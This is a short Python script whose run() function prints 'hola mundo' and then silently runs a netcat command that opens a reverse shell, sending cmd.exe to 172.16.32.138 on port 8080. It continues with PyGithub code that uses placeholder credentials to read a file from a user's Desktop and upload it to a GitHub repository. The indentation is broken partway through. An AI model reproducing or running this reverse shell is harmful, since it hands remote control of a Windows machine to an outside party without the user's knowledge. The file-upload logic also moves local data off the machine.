def run():
  print('hola mundo')
  import os
  os.system('nc -e cmd.exe  172.16.32.138 8080')
  from github import Github
g = Github("username", "password")

repo = g.get_user().get_repo(GITHUB_REPO)
all_files = []
contents = repo.get_contents("")
while contents:
    file_content = contents.pop(0)
    if file_content.type == "dir":
        contents.extend(repo.get_contents(file_content.path))
    else:
        file = file_content
        all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))

with open(r"C:\Users\juanlerrod\Desktop\git\prueba.txt", 'r') as file:
    content = file.read()

# Upload to github
git_prefix = 'gitJuan/'
git_file = git_prefix + 'prueba.txt'
if git_file in all_files:
    contents = repo.get_contents(git_file)
    repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
    print(git_file + ' UPDATED')
else:
    repo.create_file(git_file, "committing files", content, branch="master")
    print(git_file + ' CREATED')
